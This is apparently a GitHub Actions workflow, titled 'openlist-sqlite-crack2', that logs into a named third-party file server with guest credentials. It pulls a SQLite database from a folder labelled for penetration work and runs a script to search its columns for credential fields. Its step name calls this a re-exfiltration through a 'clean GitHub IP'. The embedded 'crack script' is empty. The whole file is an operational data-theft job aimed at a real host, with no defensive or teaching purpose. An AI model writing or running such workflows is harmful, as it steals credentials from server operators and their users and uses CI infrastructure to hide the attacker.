name: openlist-sqlite-crack2
on:
  workflow_dispatch:
jobs:
  grep:
    runs-on: ubuntu-latest
    steps:
      - name: Re-exfil artex.sqlite + grep all columns for credential fields (clean GitHub IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          P="/Artex  直装包  渗透网站专用/data/artex.sqlite"
          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
          RAW=$(curl -skS -m 30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$P\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('raw_url',''))" 2>/dev/null)
          curl -skS -m 120 "$RAW" -o /tmp/artex.sqlite -w "dl -> HTTP %{http_code} bytes=%{size_download}\n"
          echo "CRACK_SCRIPT_BASE64_BEGIN"
          echo '' | base64 -d > /tmp/grepcols.py
          echo "CRACK_SCRIPT_BASE64_END"
          python3 /tmp/grepcols.py
          echo "=== DONE ==="